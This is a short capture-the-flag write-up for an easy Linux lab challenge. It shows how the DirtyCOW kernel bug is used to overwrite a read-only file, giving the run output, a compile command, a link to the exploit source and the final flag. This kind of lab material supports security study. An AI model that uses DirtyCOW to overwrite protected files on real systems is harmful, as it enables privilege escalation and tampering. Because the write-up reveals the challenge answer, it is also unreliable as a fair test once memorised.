
## Challenge Information

Link: https://www.dropbox.com/scl/fi/1v60vz7iz15tqj82v1av5/CVE-Complete.ova?rlkey=3kgz9b7iw7dusjx6pozv8nnyb&st=8h1vv6oh&dl=0

Difficulty: Easy

Category: Exploit Vulnerability

Author: Jake Bailey

Description:

```
This CTF requires players to alter a read-only file to obtain a key from an executable provided to the player on the challenge machine
```

Hints:
- Man, this kernel version is OLD
- I'm deathly afraid of farm animals

Login as "tester" user with "123456" as the password

## Solution

1.  Run the key_checker executable to see that some file content must be modified to obtain the key
```
tester@CVE:~$ ./key_checker
Incorrect file content. Boo
```
2. Look at the 'flagfile' file and note its contents 
3. Create a program that exploits the DirtyCOW vulnerability and use the program to overwrite the contents of 'flagfile', changing 'no' to 'yes'.
```
tester@CVE:~$ cat checkflag
no
tester@CVE:~$ ./dirtycow flagfile yes
mmap b779f000

procselfmem 3000000

madvise 0

tester@CVE:~$ cat flagfile
yestester@CVE:~$ ./key_checker
m00000000(You found the key!)
tester@CVE:~$
```

[Here is the exploit I used to solve](exploit.c)

compilation: gcc -pthread exploit.c -o exploit

Flag: m00000000(You found the key!)
